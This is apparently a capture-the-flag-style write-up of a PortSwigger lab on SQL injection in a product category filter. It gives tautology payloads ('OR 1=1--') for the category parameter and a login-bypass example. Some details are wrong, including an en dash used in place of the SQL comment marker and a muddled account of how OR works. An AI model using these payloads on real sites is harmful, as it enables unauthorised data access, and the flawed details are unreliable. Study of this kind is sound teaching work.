@@ -1,0 +1,53 @@
+PORTSWIGGER LAB-SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+ This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+🎯 Goal-In this lab, our objective is to exploit a SQL injection vulnerability in the product category filter to reveal unreleased products.
+
+🧪 Steps -
+Open the lab and click on any product category from Gifts,Accessory etc .
+Intercept the Request in Burp Suite:
+                    Open proxy and capture the request .
+                    You’ll see a request like:
+
+                     GET /filter?category=Gifts HTTP/2  
+                              .
+                     Rest of Request body.
+                              .
+Modify the category Parameter:
+Find and replace:
+category=Gifts
+
+Replace the value with:
+✅ Payload Option 1:
+category=Gifts'+OR+1=1--
+
+Or even just:
+
+✅ Payload Option 2:
+category='+OR+1=1–
+
+ 💥and boom we solve the lab 
+After injecting the payload the SQL query look like:
+SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
+
+🧠Why These payloads work -
+category=Gifts'+OR+1=1--   or  category='+OR+1=1-- 
+Will work because-
+' : single quote (') to break out of string literals in SQL queries.
+Take an example to understand-
+SQL Query Example (Before Injection): A typical SQL query for a login form might look like this:
+SELECT * FROM users WHERE username = 'user_input' AND password = 'user_password';
+
+ In this query, the username and password are input values submitted by the user.
+
+Attack with SQL Injection (Using ' to Manipulate the Query): If we input the following for the username field:
+' OR '1'='1
+The resulting SQL query might look like this:
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'user_password';
+
+The single quote (') terminates the string for the username field.
+
+OR:We know that OR evaluates when LHS=RHS like for 1=1 it is true and for 1=2 it is false.
+
+-- :  (--) is a comment symbol in databases in most cases.So after that everything will be treated as a comment  and in the original query released = 1 is used as a restriction to hide all categories and -- will unlock other categories.
